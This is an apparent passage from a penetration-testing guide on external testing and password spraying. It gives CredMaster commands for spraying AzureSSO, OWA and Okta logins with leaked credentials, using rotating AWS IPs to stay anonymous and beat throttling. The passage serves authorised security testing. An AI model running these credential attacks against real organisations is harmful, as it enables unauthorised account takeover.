Once we have performed OSINT and additional enumeration we can start more active testing such as:

* Checking if FTP is open, and if anonymous login is enabled.
* Checking  if SSH is open and if it takes password authentication.
* Look at all http/https pages for login pages, information disclosure, and default login credentials.

## Password Spraying

We can password spray using the usernames, and emails we obtained using OneDrive User Enum and usernames, emails, and passwords from Dehashed-API-Tool. I typically spray with passwords found from Dehashed-API-Tool, and [WeakPasswords.net](https://weakpasswords.net/)

### [Credmaster](https://github.com/knavesec/CredMaster)

This tool will require an [Amazon AWS Account](https://aws.amazon.com/) to utilize their API. This tool uses [Fireprox](https://github.com/ustayready/fireprox) APIs to rotate IP addresses, stay anonymous, and beat throttling. This tool can spray against multiple environments, but the most common ones I run into are:

* AzureSSO

```
python3 credmaster.py --config config.json --plugin azuresso --domain domain.com -u users.txt -p wordlist.txt --region us-east-1 --delay 20 --randomize --trim -o OUTFILE
```

* OWA

```
python3 credmaster.py --config config.json --plugin owa --domain domain.com -u users.txt -p wordlist.txt --region us-east-1 --delay 20 --randomize --trim -o OUTFILE
```

* Okta

```
python3 credmaster.py --config config.json --plugin okta --domain domain.com -u users.txt -p wordlist.txt --region us-east-1 --delay 20 --randomize --trim -o OUTFILE
```
